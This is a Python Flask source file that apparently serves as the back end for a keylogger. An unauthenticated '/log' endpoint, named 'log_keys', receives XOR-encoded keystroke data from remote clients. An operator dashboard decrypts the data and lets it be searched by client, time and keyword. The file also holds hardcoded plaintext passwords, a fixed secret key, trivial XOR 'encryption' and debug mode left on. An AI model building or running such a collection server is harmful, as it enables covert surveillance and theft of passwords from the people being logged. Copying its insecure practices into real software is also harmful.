from flask import Flask, request, render_template, jsonify, redirect, url_for, session
from datetime import datetime

app = Flask(__name__)
app.secret_key = "supersecretkey"  # key for session

# Log storage
logs_storage = []

# Users for testing
users = {
    "admin": "1234",
    "user1": "password"
}

# XOR encryptor
class XOREncryptor:
    def __init__(self, key: str):
        self.key = key

    def decrypt(self, data: str) -> str:
        return ''.join(
            chr(ord(c) ^ ord(self.key[i % len(self.key)]))
            for i, c in enumerate(data)
        )

encryptor = XOREncryptor("mysecretkey")

# --- Login ---
@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        if username in users and users[username] == password:
            session["user"] = username
            return redirect(url_for("dashboard"))
        else:
            return render_template("login.html", error="Invalid credentials")
    return render_template("login.html")

# --- Dashboard ---
@app.route("/dashboard")
def dashboard():
    if "user" not in session:
        return redirect(url_for("login"))
    return render_template("dashboard.html", user=session["user"])

# --- Receiving logs from clients ---
@app.route("/log", methods=["POST"])
def log_keys():
    req = request.json
    data = req.get("data")
    client_id = req.get("client_id")
    logs_storage.append({
        "client_id": client_id,
        "data": data,
        "received_at": datetime.now().isoformat()
    })
    return jsonify({"status": "ok"})

# --- Receiving logs for front ---
@app.route("/get_logs")
def get_logs():
    if "user" not in session: # check if user has access rights
        return jsonify([])  

    client_id = request.args.get("client_id")
    word = request.args.get("word")
    start_time = request.args.get("start")
    end_time = request.args.get("end")

    filtered = logs_storage

    if client_id:
        filtered = [log for log in filtered if log["client_id"] == client_id]

    if start_time:
        filtered = [log for log in filtered if log["received_at"] >= start_time]

    if end_time:
        filtered = [log for log in filtered if log["received_at"] <= end_time]

    result = []
    for log in filtered:
        try:
            decrypted = encryptor.decrypt(log["data"])
        except Exception:
            decrypted = "[Error decrypting]"

        if word and word not in decrypted:
            continue

        result.append({
            "client_id": log["client_id"],
            "received_at": log["received_at"],
            "data": decrypted
        })

    return jsonify(result)

# --- Exit system ---
@app.route("/logout")
def logout():
    session.pop("user", None)
    return redirect(url_for("login"))

if __name__ == "__main__":
    app.run(debug=True)
